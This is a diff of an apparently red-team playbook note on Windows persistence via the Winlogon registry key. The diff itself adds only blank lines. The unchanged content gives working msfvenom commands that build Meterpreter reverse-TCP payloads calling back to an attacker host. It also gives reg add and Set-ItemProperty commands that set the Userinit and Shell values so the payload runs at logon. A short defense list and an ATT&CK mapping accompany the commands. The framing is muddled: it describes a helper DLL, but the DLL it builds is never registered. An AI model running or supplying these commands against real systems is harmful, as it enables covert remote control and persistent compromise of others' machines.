@@ -34,6 +34,8 @@ This procedure involves adding a malicious DLL to the Winlogon Helper DLL regist
 
 This procedure involves adding a malicious DLL to the Winlogon Helper DLL registry key in HKLM. This allows the attacker to execute code at system boot, with SYSTEM level privileges. The malicious DLL can then be used to maintain persistence, execute further attacks, or exfiltrate data. This technique can be used to bypass endpoint protection and evade detection. From a business perspective, this attack can result in data theft, system compromise, and reputational damage.
 
+ 
+
 ## Requirements
 
 1. Administrator or SYSTEM level access to the target system
@@ -41,6 +43,8 @@ This procedure involves adding a malicious DLL to the Winlogon Helper DLL regist
 1. Access to the target system's registry
 
 1. Ability to create a malicious DLL
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ This procedure involves adding a malicious DLL to the Winlogon Helper DLL regist
 
 1. Restrict access to the registry to only authorized personnel
 
+ 
+
 ## Objectives
 
 1. Achieve persistence on the target system
@@ -58,13 +64,23 @@ This procedure involves adding a malicious DLL to the Winlogon Helper DLL regist
 
 1. Maintain access to the compromised system
 
+ 
+
 # Instructions
 
 1. This command creates a Windows binary persistence by creating two binaries, one in .exe and the other in .dll format, and then adding them to the Windows registry. The binaries are created using msfvenom with the windows/meterpreter/reverse_tcp payload, which allows for remote access to the compromised system. The LHOST and LPORT parameters specify the IP address and port number of the attacker's machine. The binaries are saved as evilbinary.exe and evilbinary.dll respectively. The registry keys added are HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell. The /v flag specifies the value name, /d specifies the data, and /f specifies to force the update. Finally, the Set-ItemProperty command updates the Userinit and Shell values with the newly created binaries.
 
+ 
+
+
+
 **Code**: [[msfvenom -p windows/meterpreter/reverse_tcp LHOST=]]
 
+
+
 > The purpose of this command is to maintain persistence on a compromised Windows machine by creating two binaries and adding them to the Windows registry. Once the registry keys are updated, the binaries will be executed every time the system boots up, allowing the attacker to maintain remote access to the compromised machine.
+
+
 
 **Command** ([[Create Meterpreter Payload]]):
 
@@ -72,6 +88,10 @@ This procedure involves adding a malicious DLL to the Winlogon Helper DLL regist
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll
 ```
+
+
+
+
 
 **Command** ([[Add Payload to Winlogon Registry Key]]):
 
@@ -81,6 +101,8 @@ reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d
 Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
 Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -105,3 +127,5 @@ Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" 
 - [[Registry HKLM]]
 - [[Windows - Persistence]]
 - [[Winlogon Helper DLL]]
+
+
